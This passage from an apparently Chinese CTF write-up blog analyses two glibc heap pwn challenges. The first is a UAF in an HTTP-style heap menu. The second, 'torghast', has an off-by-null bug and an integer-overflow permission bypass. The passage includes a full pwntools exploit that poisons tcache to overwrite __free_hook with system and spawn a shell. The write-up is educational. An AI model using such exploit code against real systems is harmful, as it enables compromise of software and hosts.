  result = <span class="hljs-built_in">strcmp</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(a1 + <span class="hljs-number">8</span>), <span class="hljs-string">&quot;rotartsinimda&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( !result )<br>      flag = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-comment">/* Orphan comments:</span><br><span class="hljs-comment">size</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>对于POST数据包，如果要处理POST参数，必须要先发送一个<code>DEV</code>请求方式的数据包。之后对POST参数的处理就是正常的堆菜单。具有正常的增删改查功能。<br>POST参数格式与功能对应关系如下：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">add</span> : 1<span class="hljs-variable">&amp;index</span><span class="hljs-variable">&amp;size</span><span class="hljs-variable">&amp;content</span><br>edit : 2<span class="hljs-variable">&amp;index</span><span class="hljs-variable">&amp;content</span><br>show : 3<span class="hljs-variable">&amp;index</span><br>free : 4<span class="hljs-variable">&amp;index</span><br></code></pre></td></tr></table></figure><p>其中，add对堆块的大小数量没有限制,不过会检查content的长度与size的大小是否一致;edit正常功能，根据输入的数据检查大小是否超过堆块大小，不超过就修改内容；show打印的数据会<code>\x00</code>截断;free功能存在UAF漏洞。</p><h3 id="0x3-利用思路"><a href="#0x3-利用思路" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h3><ol><li>首先利用2.33的tcache基址和UAF漏洞泄露出heapbase;</li><li>然后通过连续释放相同大小的chunk(大于0x80)填满tcache,使多余的chunk进入unsortedbin，从而利用UAF漏洞泄露libc;</li><li>最后在利用UAF漏洞修改Tcachebin单链表的表头chunk的fd为<code>__free_hook</code>（需要经过异或）即可;</li><li>多次申请活获得<code>__free_hook</code>控制权，修改为<code>system</code>;</li><li>最后释放一个fd处存储了”&#x2F;bin&#x2F;sh\x00”的chunk即可getshell。</li></ol><h3 id="0x4-Exp"><a href="#0x4-Exp" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*- encoding: utf-<span class="hljs-number">8</span> -*-<br><br>from pwn import *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br>if REMOTE:<br>    p = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;101.200.198.40&#x27;</span>,<span class="hljs-number">40235</span>)<br>    libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;</span>)<br>else:<br>    p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;</span>)<br><br>elf = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br># gdb.<span class="hljs-built_in">attach</span>(p,<span class="hljs-string">&quot;b *0x1BDA+0x555555554000&quot;</span>) # check~<span class="hljs-number">1</span>BDA<br><br>head = b<span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span> + b<span class="hljs-string">&quot;A: B\r\n&quot;</span>*<span class="hljs-number">14</span><br><br># gdb.<span class="hljs-built_in">attach</span>(p,<span class="hljs-string">&quot;b *0x1348+0x555555554000&quot;</span>) # add<br>def <span class="hljs-built_in">add</span>(idx,size,cnt):<br>    data = head + b<span class="hljs-string">&quot;\x01&amp;&quot;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-string">&#x27;utf-8&#x27;</span>) + b<span class="hljs-string">&quot;&amp;&quot;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(size),<span class="hljs-string">&#x27;utf-8&#x27;</span>) + b<span class="hljs-string">&quot;&amp;&quot;</span> + cnt<br>    p.<span class="hljs-built_in">sendafter</span>(<span class="hljs-string">&quot;Waiting Package...\n&quot;</span>,data)<br><br># gdb.<span class="hljs-built_in">attach</span>(p,<span class="hljs-string">&quot;b *0x143B+0x555555554000&quot;</span>) # edit<br>def <span class="hljs-built_in">edit</span>(idx,cnt):<br>    data = head + b<span class="hljs-string">&quot;\x02&amp;&quot;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-string">&#x27;utf-8&#x27;</span>) + b<span class="hljs-string">&quot;&amp;&quot;</span> + cnt<br>    p.<span class="hljs-built_in">sendafter</span>(<span class="hljs-string">&quot;Waiting Package...\n&quot;</span>,data)<br><br># gdb.<span class="hljs-built_in">attach</span>(p,<span class="hljs-string">&quot;b *0x14E0+0x555555554000&quot;</span>) # edit<br>def <span class="hljs-built_in">show</span>(idx):<br>    data = head + b<span class="hljs-string">&quot;\x03&amp;&quot;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Waiting Package...\n&quot;</span>,data)<br><br># gdb.<span class="hljs-built_in">attach</span>(p,<span class="hljs-string">&quot;b *0x15A9+0x555555554000&quot;</span>) # edit<br>def <span class="hljs-built_in">free</span>(idx):<br>    data = head + b<span class="hljs-string">&quot;\x04&amp;&quot;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Waiting Package...\n&quot;</span>,data)<br><br>dev = b<span class="hljs-string">&quot;DEV / HTTP/1.1\r\n&quot;</span> + b<span class="hljs-string">&quot;A: B\r\n&quot;</span>*<span class="hljs-number">14</span> + b<span class="hljs-string">&#x27;rotartsinimda&#x27;</span><br>p.<span class="hljs-built_in">sendafter</span>(<span class="hljs-string">&quot;Waiting Package...\n&quot;</span>,dev)<br><br># gdb.<span class="hljs-built_in">attach</span>(p,<span class="hljs-string">&quot;b *0x5555555555fd&quot;</span>) # 处理函数<br># x/<span class="hljs-number">8</span>gx <span class="hljs-number">0</span>x555555554000+<span class="hljs-number">0</span>x4040  heaparray<br># gdb.<span class="hljs-built_in">attach</span>(p,<span class="hljs-string">&quot;b *0x555555555791&quot;</span>)<br><br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    <span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>x80,b<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0</span>x10)<br><br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    <span class="hljs-built_in">free</span>(i)<br><br><span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>)<br>p.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;Content-Length: 5\n&quot;</span>)<br>heapbase = <span class="hljs-built_in">u64</span>(p.<span class="hljs-built_in">recv</span>(<span class="hljs-number">5</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="hljs-number">12</span><br><span class="hljs-built_in">success</span>(<span class="hljs-built_in">hex</span>(heapbase))<br><br><span class="hljs-built_in">edit</span>(<span class="hljs-number">7</span>,b<span class="hljs-string">&#x27;B&#x27;</span>)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">7</span>)<br>p.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;Content-Length: 6\n&quot;</span>)<br>libc.address = <span class="hljs-built_in">u64</span>(p.<span class="hljs-built_in">recv</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0</span>x1e0c42<br><span class="hljs-built_in">success</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br># 释放的chunk的地址右移<span class="hljs-number">12</span>bit然后与对应tcachebin的头部chunk的地址异或，放入fd，bk放代表tcache的堆块地址<br># 链表伪造方法：被修改堆块的地址右移<span class="hljs-number">12</span>bit，然后与目标地址异或即可<br>payload = <span class="hljs-built_in">p64</span>(((heapbase + <span class="hljs-number">0</span>x600)&gt;&gt;<span class="hljs-number">12</span>)^free_hook) <br><span class="hljs-built_in">edit</span>(<span class="hljs-number">6</span>,payload)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">10</span>,<span class="hljs-number">0</span>x80,b<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">11</span>,<span class="hljs-number">0</span>x80,<span class="hljs-built_in">p64</span>(system))<br><span class="hljs-built_in">free</span>(<span class="hljs-number">10</span>) # trigger<br><br># gdb.<span class="hljs-built_in">attach</span>(p)<br>p.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h3 id="0x5-Summary"><a href="#0x5-Summary" class="headerlink" title="0x5 Summary"></a>0x5 Summary</h3><p>字符的处理需要非常注意，由于分支判断的choice是由字符转成数字，所以不能直接传输‘1’，否则在转换成数字时，会根据ascii码转换成0x31；<br>2.33的<code>unsortedbin</code>中的<code>main_arena+offset</code>的最低字节是<code>\x00</code>,对于输出存在截断的函数，还需要修改该字节才行。修改之后，如果无法恢复，则无法再申请该堆块，否则会报错。</p><h2 id="torghast"><a href="#torghast" class="headerlink" title="torghast"></a>torghast</h2><h3 id="0x0-前言-1"><a href="#0x0-前言-1" class="headerlink" title="0x0 前言"></a>0x0 前言</h3><p>一道拐弯抹角的House of Einherjar利用</p><h3 id="0x1-程序分析-1"><a href="#0x1-程序分析-1" class="headerlink" title="0x1 程序分析"></a>0x1 程序分析</h3><ul><li>checksec pwn : 保护全开</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><ul><li>libc-2.31.so(2.31-0ubuntu9.7)</li><li>file pwn<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwn</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">31</span>-<span class="hljs-number">0</span>ubuntu9.<span class="hljs-number">7</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">4</span>e8f2c916b0c1e88f574f999076718e5fa14dd0f, stripped<br></code></pre></td></tr></table></figure></li></ul><h3 id="0x2-程序分析-1"><a href="#0x2-程序分析-1" class="headerlink" title="0x2 程序分析"></a>0x2 程序分析</h3><p>该程序只要分为3各部分：JoinGame()，SelectUser()，PlayerManager()。并且在进入这些功能之前会创建一个初始用户（index&#x3D;0）</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">User</span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> UserIdx;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> HP;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> MP;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> unknow;<br>    <span class="hljs-type">char</span>* UserData;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> size;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中JoinGame()又分为3个功能点：Challange()，UseMagic()，GetDiary()。<br>其中PlayerManager()是一个正常的堆菜单：AddUser()，EditUser(),DeleteUser()：</p><ul><li>AddUser()函数可以申请任意大小的堆块，并且最多同时存在16个堆块。申请成功之后设置User.size为堆块大小，并分别设置HP,MP的初始值为0x64和0x5f5e0ff。</li><li>DeleteUser()函数是一个正常的删除功能，会将User.UserData和User.size置为0。<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk">unsigned __int64 EditUser()<br>&#123;<br>  unsigned int idx; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">18</span>h]<br>  char buf[<span class="hljs-number">8</span>]; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">10</span>h] [rbp-<span class="hljs-number">10</span>h] BYREF<br>  unsigned __int64 v3; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">18</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  v3 = __readfsqword(<span class="hljs-number">0</span>x28u);<br>  puts(<span class="hljs-string">&quot;Which Player To Change?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">3</span>uLL);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0</span>x10 )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Segmentation Fault&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !heaparray[<span class="hljs-number">6</span> * idx] )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Segmentation Fault&quot;</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Your Log:&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( (int)read(<span class="hljs-number">0</span>, (void *)heaparray[<span class="hljs-number">6</span> * idx], Size[<span class="hljs-number">6</span> * idx]) == Size[<span class="hljs-number">6</span> * idx] )<br>    *(_BYTE *)(heaparray[<span class="hljs-number">6</span> * idx] + Size[<span class="hljs-number">6</span> * idx]) = <span class="hljs-number">0</span>;<span class="hljs-regexp">//</span> off-by-null<br>  return __readfsqword(<span class="hljs-number">0</span>x28u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>其中，EditUser()存在<code>off-by-null</code>漏洞。<br>该程序唯一一个打印堆块数据的功能为JoinGame()下的GetDiary()<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssize_t <span class="hljs-built_in">GetDiary</span>()<br>&#123;<br>  <span class="hljs-built_in">puts</span>(&quot;Here Is The Adventure Log:&quot;);<br>  return <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, (const void *)heaparray<span class="hljs-selector-attr">[6 * SelectedUser_Idx]</span>, Size<span class="hljs-selector-attr">[6 * SelectedUser_Idx]</span>);<br>&#125;<br></code></pre></td></tr></table></figure>其中，SelectedUser_Idx又由SelectUser()指定</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk">unsigned __int64 SelectUser()<br>&#123;<br>  unsigned int idx; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">14</span>h]<br>  char buf[<span class="hljs-number">8</span>]; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">10</span>h] [rbp-<span class="hljs-number">10</span>h] BYREF<br>  unsigned __int64 v3; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">18</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  v3 = __readfsqword(<span class="hljs-number">0</span>x28u);<br>  <span class="hljs-keyword">if</span> ( PermissionFlag )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Choose Which User?&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">3</span>uLL);<br>    idx = atoi(buf);<br>    <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0</span>x10 )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;Segmentation Fault&quot;</span>);<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( !heaparray[<span class="hljs-number">6</span> * idx] )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;Segmentation Fault&quot;</span>);<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    SelectedUser_Idx = idx;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    puts(<span class="hljs-string">&quot;Permission denied!&quot;</span>);<br>  &#125;<br>  return __readfsqword(<span class="hljs-number">0</span>x28u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此想要打印指定堆块内容，需要获取权限（即 PermissionFlag&#x3D;1）。为此我们需要执行<code>JoinGame()-&gt;Challange()-&gt;level3_func()</code>,且需要<code>MasterFlag=1</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">level3_func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;---- Tarragrue ----&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;HP: ????/????&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Reward: ????????&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hard: MAX&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;---- Our Player ----&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HP: %d\n&quot;</span>, HP[<span class="hljs-number">6</span> * SelectedUser_Idx]);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;MP: %d\n&quot;</span>, MP[<span class="hljs-number">6</span> * SelectedUser_Idx]);<br>  <span class="hljs-keyword">if</span> ( !MasterFlag )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;MayBe Only Cheat Will Help You To Deal Tarragrue&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;DoDoDoDo~dddd~You Win&quot;</span>);<br>  result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Gain The Reward&quot;</span>);<br>  PermissionFlag = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>若要执行<code>level3_func()</code>，首先要依次执行<code>level1_func()</code>和<code>level2_func()</code>,即执行3次<code>Challange()</code><br>若要设置<code>MasterFlag=1</code>，需要满足<code>MP[6 * SelectedUser_Idx] &gt; 0x5F5E0FE</code>，但是正常而言User.MP只会小于等于0x5F5E0FE（因为只有减法），但是判断语句存在整数溢出，因此可以通过多次减法造成整数溢出来满足该条件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">SET_HP_MP</span><span class="hljs-params">(<span class="hljs-type">int</span> choice)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 *value; <span class="hljs-comment">// rax</span><br><br>  value = (__int64 *)MP[<span class="hljs-number">6</span> * SelectedUser_Idx];<br>  <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)MP[<span class="hljs-number">6</span> * SelectedUser_Idx] &gt; <span class="hljs-number">0x5F5E0FE</span> ) <span class="hljs-comment">// 整数溢出</span><br>    &#123;<br>      MasterFlag = <span class="hljs-number">1</span>; <span class="hljs-comment">// 目标</span><br>      <span class="hljs-built_in">LODWORD</span>(value) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome GAME MASTER&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( choice &lt;= <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( MP[<span class="hljs-number">6</span> * SelectedUser_Idx] &gt; <span class="hljs-number">0</span> )<br>      &#123;<br>        MP[<span class="hljs-number">6</span> * SelectedUser_Idx] -= <span class="hljs-number">10LL</span>;<br>        value = HP;<br>        HP[<span class="hljs-number">6</span> * SelectedUser_Idx] += <span class="hljs-number">100LL</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)value;<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( choice != <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( choice != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)value;<br>      <span class="hljs-keyword">if</span> ( MP[<span class="hljs-number">6</span> * SelectedUser_Idx] &gt; <span class="hljs-number">0</span> )<br>      &#123;<br>        MP[<span class="hljs-number">6</span> * SelectedUser_Idx] -= <span class="hljs-number">25LL</span>;<br>        value = HP;<br>        HP[<span class="hljs-number">6</span> * SelectedUser_Idx] += <span class="hljs-number">0x12C</span>LL;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)value;<br>      &#125;<br>LABEL_15:<br>      <span class="hljs-built_in">LODWORD</span>(value) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO MORE MP&quot;</span>);<br>      <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)value;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( MP[<span class="hljs-number">6</span> * SelectedUser_Idx] &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    MP[<span class="hljs-number">6</span> * SelectedUser_Idx] -= <span class="hljs-number">50LL</span>;<br>    value = HP;<br>    HP[<span class="hljs-number">6</span> * SelectedUser_Idx] += <span class="hljs-number">500LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)value;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x3-利用思路-1"><a href="#0x3-利用思路-1" class="headerlink" title="0x3 利用思路"></a>0x3 利用思路</h3><ol><li>首先，通过多次对User.MP进行减法造成整数溢出，从而获取Selected_Idx的控制权，从而可以打印任意堆块；</li><li>然后通过多次连续申请释放堆块，使堆块填满tcache，进入unsortedbin，然后再次申请它们，利用脏数据获取libcbase和heapbase；</li><li>由于只存在off-by-null漏洞，因此构造 House of Einherjar 漏洞，从而实现任意地址写;</li><li>修改<code>__free_hook</code>为<code>system</code>，然后释放堆块触发即可。</li></ol><h3 id="0x4-Exp-1"><a href="#0x4-Exp-1" class="headerlink" title="0x4 Exp"></a>0x4 Exp</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 